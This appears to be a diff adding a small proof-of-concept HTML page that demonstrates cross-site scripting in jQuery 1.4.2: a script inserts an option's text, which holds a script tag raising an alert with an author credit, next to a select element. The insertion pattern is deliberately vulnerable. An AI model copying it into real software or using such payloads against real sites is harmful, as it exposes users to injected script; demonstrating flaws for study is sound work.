@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>XSS Reflected - Jquery 1.4.2 </title>
+  <script src="http://www.example.com/js/jquery.js"></script>
+  <script>
+    $(function() {
+      $('#users').each(function() {
+        var select = $(this);
+        var option = select.children('option').first();
+        select.after(option.text());
+        select.hide();
+      });
+    });
+  </script>
+</head>
+
+
+<body>
+  <form method="post">
+    <p>
+      <select id="users" name="users">
+        <option value="xssreflected"><script>alert(&#x27;xss
+reflected - jquery 1.4.2 by - 01.09.2014 18:07:14 Sao Paulo/Brazil
+@firebitsbr - mauro.risonho@gmail.com&#x27;);</script></option>
+      </select>
+    </p>
+  </form>
+</body>
+</html>
